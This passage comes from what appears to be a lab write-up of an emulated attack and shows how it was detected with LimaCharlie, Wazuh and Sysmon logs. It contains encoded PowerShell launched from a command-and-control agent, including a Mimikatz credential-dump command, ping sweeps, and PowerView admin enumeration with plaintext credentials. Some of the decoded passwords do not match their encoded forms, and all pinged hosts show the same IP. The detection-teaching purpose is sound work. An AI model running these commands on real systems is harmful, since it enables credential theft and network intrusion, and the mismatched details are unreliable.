Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: powershell.exe -ExecutionPolicy Bypass -C "powershell -Enc SQBtAHAAbwByAHQALQBNAG8AZAB1AGwAZQAgAC4AXABpAG4AdgBvAGsAZQAtAG0AaQBtAGkALgBwAHMAMQA7AEkAbgB2AG8AawBlAC0ATQBpAG0AaQBrAGEAdAB6ACAALQBEAHUAbQBwAEMAcgBlAGQAcwA="
CurrentDirectory: C:\Windows\system32\
User: SSNRSHNN\goadmin
LogonGuid: {46fa3f9b-8462-68db-9157-220100000000}
LogonId: 0x1225791
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=2E5A8590CF6848968FC23DE3FA1E25F1,SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6
ParentProcessGuid: {46fa3f9b-8f03-68db-6404-000000000900}
ParentProcessId: 8008
ParentImage: C:\Users\Public\Client1.exe
ParentCommandLine: "C:\Users\Public\Client1.exe" -server http://10.1.4.40:8888 -group red 
ParentUser: SSNRSHNN\goadmin"
```

## Step 5 - Remote Host Ping:

**Base64:**
```
powershell -Enc cABpAG4AZwAgAGUAeABjAGgAYQBuAGcAZQAuAHMAcwBuAHIAcwBoAG4AbgAuAGwAbwBjAGEAbAA=
```
```
powershell -Enc cABpAG4AZwAgAGMAbABpAGUAbgB0ADIALgBzAHMAbgByAHMAaABuAG4ALgBsAG8AYwBhAGwA
```
```
powershell -Enc cABpAG4AZwAgAGMAbABpAGUAbgB0ADEALgBzAHMAbgByAHMAaABuAG4ALgBsAG8AYwBhAGwA
```
```
powershell -Enc cABpAG4AZwAgAGEAZAAtAGQAYwAuAHMAcwBuAHIAcwBoAG4AbgAuAGwAbwBjAGEAbAA=
```

**Decoded:**
```
ping exchange.ssnrshnn.local
```
```
ping client2.ssnrshnn.local
```
```
ping client1.ssnrshnn.local
```
```
ping ad-dc.ssnrshnn.local
```

**Command Output:**

```
Pinging exchange.ssnrshnn.local [10.1.1.20] with 32 bytes of data:
Reply from 10.1.1.20: bytes=32 time=1ms TTL=127
Reply from 10.1.1.20: bytes=32 time=1ms TTL=127
Reply from 10.1.1.20: bytes=32 time=1ms TTL=127
Reply from 10.1.1.20: bytes=32 time=1ms TTL=127

Ping statistics for 10.1.1.20:
    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
Approximate round trip times in milli-seconds:
    Minimum = 1ms, Maximum = 1ms, Average = 1ms
```

```
Pinging client2.ssnrshnn.local [10.1.1.20] with 32 bytes of data:
Reply from 10.1.1.20: bytes=32 time=1ms TTL=127
Reply from 10.1.1.20: bytes=32 time=1ms TTL=127
Reply from 10.1.1.20: bytes=32 time=1ms TTL=127
Reply from 10.1.1.20: bytes=32 time=1ms TTL=127

Ping statistics for 10.1.1.20:
    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
Approximate round trip times in milli-seconds:
    Minimum = 1ms, Maximum = 1ms, Average = 1ms
```

```
Pinging client1.ssnrshnn.local [10.1.1.20] with 32 bytes of data:
Reply from 10.1.1.20: bytes=32 time=1ms TTL=127
Reply from 10.1.1.20: bytes=32 time=1ms TTL=127
Reply from 10.1.1.20: bytes=32 time=1ms TTL=127
Reply from 10.1.1.20: bytes=32 time=1ms TTL=127

Ping statistics for 10.1.1.20:
    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
Approximate round trip times in milli-seconds:
    Minimum = 1ms, Maximum = 1ms, Average = 1ms
```

```
Pinging ad-dc.ssnrshnn.local [10.1.1.20] with 32 bytes of data:
Reply from 10.1.1.20: bytes=32 time=1ms TTL=127
Reply from 10.1.1.20: bytes=32 time=1ms TTL=127
Reply from 10.1.1.20: bytes=32 time=1ms TTL=127
Reply from 10.1.1.20: bytes=32 time=1ms TTL=127

Ping statistics for 10.1.1.20:
    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
Approximate round trip times in milli-seconds:
    Minimum = 1ms, Maximum = 1ms, Average = 1ms
```

**LimaCharlie:**

I will include the first process's screenshots; the others associated with this step are the same.

**First Process:**

![alice](/images/calderaalice/38.png)

**Process Tree:**

![alice](/images/calderaalice/39.png)

**LimaCharlie Detection:**

**First Process:**

![alice](/images/calderaalice/46.png)


**Detection Rules that are matched with relevant processes:**

- **ext-sigma-7a14fbc3-54d9-4b4d-8700-61eddada04f0**
- **soteria-rules-edr-926e2197-189b-4d89-9675-c8993933dc9a**


**Wazuh Output:**

![alice](/images/calderaalice/50.png)


![alice](/images/calderaalice/51.png)


**Sysmon Output:**

```json
"Process Create:
RuleName: -
UtcTime: 2025-09-30 09:28:05.393
ProcessGuid: {46fa3f9b-a2a5-68db-2105-000000000900}
ProcessId: 9952
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.19041.3996 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: powershell.exe -ExecutionPolicy Bypass -C "powershell -Enc cABpAG4AZwAgAGUAeABjAGgAYQBuAGcAZQAuAHMAcwBuAHIAcwBoAG4AbgAuAGwAbwBjAGEAbAA="
CurrentDirectory: C:\Windows\system32\
User: SSNRSHNN\goadmin
LogonGuid: {46fa3f9b-8462-68db-9157-220100000000}
LogonId: 0x1225791
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=2E5A8590CF6848968FC23DE3FA1E25F1,SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6
ParentProcessGuid: {46fa3f9b-8f03-68db-6404-000000000900}
ParentProcessId: 8008
ParentImage: C:\Users\Public\Client1.exe
ParentCommandLine: "C:\Users\Public\Client1.exe" -server http://10.1.4.40:8888 -group red 
ParentUser: SSNRSHNN\goadmin"
```

**ping.exe**

![alice](/images/calderaalice/52.png)


![alice](/images/calderaalice/53.png)


**Sysmon Output:**

```json
"Process Create:
RuleName: -
UtcTime: 2025-09-30 09:28:05.734
ProcessGuid: {46fa3f9b-a2a5-68db-2305-000000000900}
ProcessId: 9976
Image: C:\Windows\System32\PING.EXE
FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
Description: TCP/IP Ping Command
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: ping.exe
CommandLine: "C:\Windows\system32\PING.EXE" exchange.ssnrshnn.local
CurrentDirectory: C:\Windows\system32\
User: SSNRSHNN\goadmin
LogonGuid: {46fa3f9b-8462-68db-9157-220100000000}
LogonId: 0x1225791
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=2F46799D79D22AC72C241EC0322B011D,SHA256=7AF50FA112932EA3284F7821B2EEA2B7582F558DBA897231BB82182003C29F8B,IMPHASH=8C3BE1286CDAD6AC1136D0BB6C83FF41
ParentProcessGuid: {46fa3f9b-a2a5-68db-2205-000000000900}
ParentProcessId: 7088
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -Enc cABpAG4AZwAgAGUAeABjAGgAYQBuAGcAZQAuAHMAcwBuAHIAcwBoAG4AbgAuAGwAbwBjAGEAbAA=
ParentUser: SSNRSHNN\goadmin"
```

The rest of the alerts in Wazuh are the same apart from the machine names. I will not include them here to avoid clutter.

## Step 6 - Account-type Admin Enumeration:

**Base64:**
```
powershell -Enc SQBtAHAAbwByAHQALQBNAG8AZAB1AGwAZQAgAC4AXABwAG8AdwBlAHIAdgBpAGUAdwAuAHAAcwAxADsAJABiAGEAYwBrAHUAcAAgAD0AIAAiAGcAZQB0AF8AYQBkAG0AaQBuACIAOwAkAHUAcwBlAHIATgBhAG0AZQAgAD0AIAAiAHMAcwBuAHIAcwBoAG4AbgAuAGwAbwBjAGEAbABcAGcAbwBhAGQAbQBpAG4AIgA7ACQAdQBzAGUAcgBQAGEAcwBzAHcAbwByAGQAIAA9ACAAIgBTAG8AbgBlAHIALgBvADEAIgA7ACQAcwBlAGMAUwB0AHIAaQBuAGcAUABhAHMAcwB3AG8AcgBkACAAPQAgAEMAbwBuAHYAZQByAHQAVABvAC0AUwBlAGMAdQByAGUAUwB0AHIAaQBuAGcAIAAkAHUAcwBlAHIAUABhAHMAcwB3AG8AcgBkACAALQBBAHMAUABsAGEAaQBuAFQAZQB4AHQAIAAtAEYAbwByAGMAZQA7ACQAYwByAGUAZABPAGIAagBlAGMAdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFAAUwBDAHIAZQBkAGUAbgB0AGkAYQBsACAAKAAkAHUAcwBlAHIATgBhAG0AZQAsACAAJABzAGUAYwBTAHQAcgBpAG4AZwBQAGEAcwBzAHcAbwByAGQAKQA7AEcAZQB0AC0ATgBlAHQATABvAGMAYQBsAEcAcgBvAHUAcABNAGUAbQBiAGUAcgAgAC0AQwBvAG0AcAB1AHQAZQByAE4AYQBtAGUAIABlAHgAYwBoAGEAbgBnAGUALgBzAHMAbgByAHMAaABuAG4ALgBsAG8AYwBhAGwAIAAtAEMAcgBlAGQAZQBuAHQAaQBhAGwAIAAkAGMAcgBlAGQATwBiAGoAZQBjAHQA
```
```
powershell -Enc SQBtAHAAbwByAHQALQBNAG8AZAB1AGwAZQAgAC4AXABwAG8AdwBlAHIAdgBpAGUAdwAuAHAAcwAxADsAJABiAGEAYwBrAHUAcAAgAD0AIAAiAGcAZQB0AF8AYQBkAG0AaQBuACIAOwAkAHUAcwBlAHIATgBhAG0AZQAgAD0AIAAiAHMAcwBuAHIAcwBoAG4AbgAuAGwAbwBjAGEAbABcAGcAbwBhAGQAbQBpAG4AIgA7ACQAdQBzAGUAcgBQAGEAcwBzAHcAbwByAGQAIAA9ACAAIgBTAG8AbgBlAHIALgBvADEAIgA7ACQAcwBlAGMAUwB0AHIAaQBuAGcAUABhAHMAcwB3AG8AcgBkACAAPQAgAEMAbwBuAHYAZQByAHQAVABvAC0AUwBlAGMAdQByAGUAUwB0AHIAaQBuAGcAIAAkAHUAcwBlAHIAUABhAHMAcwB3AG8AcgBkACAALQBBAHMAUABsAGEAaQBuAFQAZQB4AHQAIAAtAEYAbwByAGMAZQA7ACQAYwByAGUAZABPAGIAagBlAGMAdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFAAUwBDAHIAZQBkAGUAbgB0AGkAYQBsACAAKAAkAHUAcwBlAHIATgBhAG0AZQAsACAAJABzAGUAYwBTAHQAcgBpAG4AZwBQAGEAcwBzAHcAbwByAGQAKQA7AEcAZQB0AC0ATgBlAHQATABvAGMAYQBsAEcAcgBvAHUAcABNAGUAbQBiAGUAcgAgAC0AQwBvAG0AcAB1AHQAZQByAE4AYQBtAGUAIABjAGwAaQBlAG4AdAAyAC4AcwBzAG4AcgBzAGgAbgBuAC4AbABvAGMAYQBsACAALQBDAHIAZQBkAGUAbgB0AGkAYQBsACAAJABjAHIAZQBkAE8AYgBqAGUAYwB0AA==
```
```
powershell -Enc SQBtAHAAbwByAHQALQBNAG8AZAB1AGwAZQAgAC4AXABwAG8AdwBlAHIAdgBpAGUAdwAuAHAAcwAxADsAJABiAGEAYwBrAHUAcAAgAD0AIAAiAGcAZQB0AF8AYQBkAG0AaQBuACIAOwAkAHUAcwBlAHIATgBhAG0AZQAgAD0AIAAiAHMAcwBuAHIAcwBoAG4AbgAuAGwAbwBjAGEAbABcAGcAbwBhAGQAbQBpAG4AIgA7ACQAdQBzAGUAcgBQAGEAcwBzAHcAbwByAGQAIAA9ACAAIgBTAG8AbgBlAHIALgBvADEAIgA7ACQAcwBlAGMAUwB0AHIAaQBuAGcAUABhAHMAcwB3AG8AcgBkACAAPQAgAEMAbwBuAHYAZQByAHQAVABvAC0AUwBlAGMAdQByAGUAUwB0AHIAaQBuAGcAIAAkAHUAcwBlAHIAUABhAHMAcwB3AG8AcgBkACAALQBBAHMAUABsAGEAaQBuAFQAZQB4AHQAIAAtAEYAbwByAGMAZQA7ACQAYwByAGUAZABPAGIAagBlAGMAdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFAAUwBDAHIAZQBkAGUAbgB0AGkAYQBsACAAKAAkAHUAcwBlAHIATgBhAG0AZQAsACAAJABzAGUAYwBTAHQAcgBpAG4AZwBQAGEAcwBzAHcAbwByAGQAKQA7AEcAZQB0AC0ATgBlAHQATABvAGMAYQBsAEcAcgBvAHUAcABNAGUAbQBiAGUAcgAgAC0AQwBvAG0AcAB1AHQAZQByAE4AYQBtAGUAIABjAGwAaQBlAG4AdAAxAC4AcwBzAG4AcgBzAGgAbgBuAC4AbABvAGMAYQBsACAALQBDAHIAZQBkAGUAbgB0AGkAYQBsACAAJABjAHIAZQBkAE8AYgBqAGUAYwB0AA==
```
```
powershell -Enc SQBtAHAAbwByAHQALQBNAG8AZAB1AGwAZQAgAC4AXABwAG8AdwBlAHIAdgBpAGUAdwAuAHAAcwAxADsAJABiAGEAYwBrAHUAcAAgAD0AIAAiAGcAZQB0AF8AYQBkAG0AaQBuACIAOwAkAHUAcwBlAHIATgBhAG0AZQAgAD0AIAAiAHMAcwBuAHIAcwBoAG4AbgAuAGwAbwBjAGEAbABcAGcAbwBhAGQAbQBpAG4AIgA7ACQAdQBzAGUAcgBQAGEAcwBzAHcAbwByAGQAIAA9ACAAIgBTAG8AbgBlAHIALgBvADEAIgA7ACQAcwBlAGMAUwB0AHIAaQBuAGcAUABhAHMAcwB3AG8AcgBkACAAPQAgAEMAbwBuAHYAZQByAHQAVABvAC0AUwBlAGMAdQByAGUAUwB0AHIAaQBuAGcAIAAkAHUAcwBlAHIAUABhAHMAcwB3AG8AcgBkACAALQBBAHMAUABsAGEAaQBuAFQAZQB4AHQAIAAtAEYAbwByAGMAZQA7ACQAYwByAGUAZABPAGIAagBlAGMAdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFAAUwBDAHIAZQBkAGUAbgB0AGkAYQBsACAAKAAkAHUAcwBlAHIATgBhAG0AZQAsACAAJABzAGUAYwBTAHQAcgBpAG4AZwBQAGEAcwBzAHcAbwByAGQAKQA7AEcAZQB0AC0ATgBlAHQATABvAGMAYQBsAEcAcgBvAHUAcABNAGUAbQBiAGUAcgAgAC0AQwBvAG0AcAB1AHQAZQByAE4AYQBtAGUAIABhAGQALQBkAGMALgBzAHMAbgByAHMAaABuAG4ALgBsAG8AYwBhAGwAIAAtAEMAcgBlAGQAZQBuAHQAaQBhAGwAIAAkAGMAcgBlAGQATwBiAGoAZQBjAHQA
```

**Decoded:**
```
Import-Module .\powerview.ps1;$backup = "get_admin";$userName = "ssnrshnn.local\goadmin";$secStringPassword = ConvertTo-SecureString "Test123!" -AsPlainText -Force;$credObject = New-Object System.Management.Automation.PSCredential ($userName, $secStringPassword);Get-NetLocalGroupMember -ComputerName exchange.ssnrshnn.local -Credential $credObject
```

```
Import-Module .\powerview.ps1;$backup = "get_admin";$userName = "ssnrshnn.local\goadmin";$secStringPassword = ConvertTo-SecureString "Test123!" -AsPlainText -Force;$credObject = New-Object System.Management.Automation.PSCredential ($userName, $secStringPassword);Get-NetLocalGroupMember -ComputerName client2.ssnrshnn.local -Credential $credObject
```

```
Import-Module .\powerview.ps1;$backup = "get_admin";$userName = "ssnrshnn.local\goadmin";$secStringPassword = ConvertTo-SecureString "Test123!" -AsPlainText -Force;$credObject = New-Object System.Management.Automation.PSCredential ($userName, $secStringPassword);Get-NetLocalGroupMember -ComputerName client1.ssnrshnn.local -Credential $credObject
```

```
Import-Module .\powerview.ps1;$backup = "get_admin";$userName = "ssnrshnn.local\goadmin";$userPassword = "Soner.o1";$secStringPassword = ConvertTo-SecureString $userPassword -AsPlainText -Force;$credObject = New-Object System.Management.Automation.PSCredential ($userName, $secStringPassword);Get-NetLocalGroupMember -ComputerName ad-dc.ssnrshnn.local -Credential $credObject
```


**Command Output:**

```
ComputerName : exchange.ssnrshnn.local
GroupName    : Administrators
MemberName   : EXCHANGE\Administrator
SID          : S-1-5-21-1945855000-140921441-2322798616-500
IsGroup      : False
IsDomain     : False

ComputerName : exchange.ssnrshnn.local
GroupName    : Administrators
MemberName   : SSNRSHNN\Domain Admins
SID          : S-1-5-21-2105100566-3451255-233295498-512
IsGroup      : True
IsDomain     : True

ComputerName : exchange.ssnrshnn.local
GroupName    : Administrators
MemberName   : SSNRSHNN\Organization Management
SID          : S-1-5-21-2105100566-3451255-233295498-1111
IsGroup      : True
IsDomain     : True

ComputerName : exchange.ssnrshnn.local
GroupName    : Administrators
MemberName   : SSNRSHNN\Exchange Trusted Subsystem
SID          : S-1-5-21-2105100566-3451255-233295498-1126
IsGroup      : True
IsDomain     : True
```

```
ComputerName : client2.ssnrshnn.local
GroupName    : Administrators
MemberName   : CLIENT2\Administrator
SID          : S-1-5-21-1149899384-3851703988-751053742-500
IsGroup      : False
IsDomain     : False

ComputerName : client2.ssnrshnn.local
GroupName    : Administrators
MemberName   : CLIENT2\client2
SID          : S-1-5-21-1149899384-3851703988-751053742-1001
IsGroup      : False
IsDomain     : False

ComputerName : client2.ssnrshnn.local
GroupName    : Administrators
MemberName   : SSNRSHNN\Domain Admins
SID          : S-1-5-21-2105100566-3451255-233295498-512
IsGroup      : True
IsDomain     : True
```

```
ComputerName : client1.ssnrshnn.local
GroupName    : Administrators
MemberName   : CLIENT1\Administrator
SID          : S-1-5-21-4174197286-1528992158-1233857966-500
IsGroup      : False
IsDomain     : False

ComputerName : client1.ssnrshnn.local
GroupName    : Administrators
MemberName   : CLIENT1\client1
SID          : S-1-5-21-4174197286-1528992158-1233857966-1001
IsGroup      : False
IsDomain     : False

ComputerName : client1.ssnrshnn.local
GroupName    : Administrators
MemberName   : SSNRSHNN\Domain Admins
SID          : S-1-5-21-2105100566-3451255-233295498-512
IsGroup      : True
IsDomain     : True
```

```
ComputerName : ad-dc.ssnrshnn.local
GroupName    : Administrators
MemberName   : SSNRSHNN\Administrator
SID          : S-1-5-21-2105100566-3451255-233295498-500
IsGroup      : False
IsDomain     : False

ComputerName : ad-dc.ssnrshnn.local
GroupName    : Administrators
MemberName   : SSNRSHNN\Enterprise Admins
SID          : S-1-5-21-2105100566-3451255-233295498-519
IsGroup      : True
IsDomain     : False

ComputerName : ad-dc.ssnrshnn.local
GroupName    : Administrators
MemberName   : SSNRSHNN\Domain Admins
SID          : S-1-5-21-2105100566-3451255-233295498-512
IsGroup      : True
IsDomain     : False
```


**LimaCharlie:**

**First Process:**

![alice](/images/calderaalice/54.png)


**Process Tree:**

![alice](/images/calderaalice/55.png)



**LimaCharlie Detection:**

![alice](/images/calderaalice/56.png)



**Detection Rules that are matched with relevant processes:**

- **ext-sigma-7a14fbc3-54d9-4b4d-8700-61eddada04f0**
- **soteria-rules-edr-926e2197-189b-4d89-9675-c8993933dc9a**


**Wazuh Output:**

![alice](/images/calderaalice/57.png)



![alice](/images/calderaalice/58.png)


**Sysmon Output:**

```json
"Process Create:
RuleName: -
UtcTime: 2025-09-30 09:31:13.592
ProcessGuid: {46fa3f9b-a361-68db-2e05-000000000900}
ProcessId: 3000
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.19041.3996 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: powershell.exe -ExecutionPolicy Bypass -C "powershell -Enc SQBtAHAAbwByAHQALQBNAG8AZAB1AGwAZQAgAC4AXABwAG8AdwBlAHIAdgBpAGUAdwAuAHAAcwAxADsAJABiAGEAYwBrAHUAcAAgAD0AIAAiAGcAZQB0AF8AYQBkAG0AaQBuACIAOwAkAHUAcwBlAHIATgBhAG0AZQAgAD0AIAAiAHMAcwBuAHIAcwBoAG4AbgAuAGwAbwBjAGEAbABcAGcAbwBhAGQAbQBpAG4AIgA7ACQAdQBzAGUAcgBQAGEAcwBzAHcAbwByAGQAIAA9ACAAIgBTAG8AbgBlAHIALgBvADEAIgA7ACQAcwBlAGMAUwB0AHIAaQBuAGcAUABhAHMAcwB3AG8AcgBkACAAPQAgAEMAbwBuAHYAZQByAHQAVABvAC0AUwBlAGMAdQByAGUAUwB0AHIAaQBuAGcAIAAkAHUAcwBlAHIAUABhAHMAcwB3AG8AcgBkACAALQBBAHMAUABsAGEAaQBuAFQAZQB4AHQAIAAtAEYAbwByAGMAZQA7ACQAYwByAGUAZABPAGIAagBlAGMAdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFAAUwBDAHIAZQBkAGUAbgB0AGkAYQBsACAAKAAkAHUAcwBlAHIATgBhAG0AZQAsACAAJABzAGUAYwBTAHQAcgBpAG4AZwBQAGEAcwBzAHcAbwByAGQAKQA7AEcAZQB0AC0ATgBlAHQATABvAGMAYQBsAEcAcgBvAHUAcABNAGUAbQBiAGUAcgAgAC0AQwBvAG0AcAB1AHQAZQByAE4AYQBtAGUAIABlAHgAYwBoAGEAbgBnAGUALgBzAHMAbgByAHMAaABuAG4ALgBsAG8AYwBhAGwAIAAtAEMAcgBlAGQAZQBuAHQAaQBhAGwAIAAkAGMAcgBlAGQATwBiAGoAZQBjAHQA"
CurrentDirectory: C:\Windows\system32\
User: SSNRSHNN\goadmin
LogonGuid: {46fa3f9b-8462-68db-9157-220100000000}
LogonId: 0x1225791
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=2E5A8590CF6848968FC23DE3FA1E25F1,SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6
ParentProcessGuid: {46fa3f9b-8f03-68db-6404-000000000900}
ParentProcessId: 8008
ParentImage: C:\Users\Public\Client1.exe
ParentCommandLine: "C:\Users\Public\Client1.exe" -server http://10.1.4.40:8888 -group red 
ParentUser: SSNRSHNN\goadmin"
```


That's the end of the attack scenario. 

Of course, LimaCharlie, Wazuh, and Suricata offer far more capabilities than shown here. In this scenario, I aimed to show you the basics of investigation.

Thank you for taking the time to read this article. I hope you'll find it useful.

Keep up the good work!














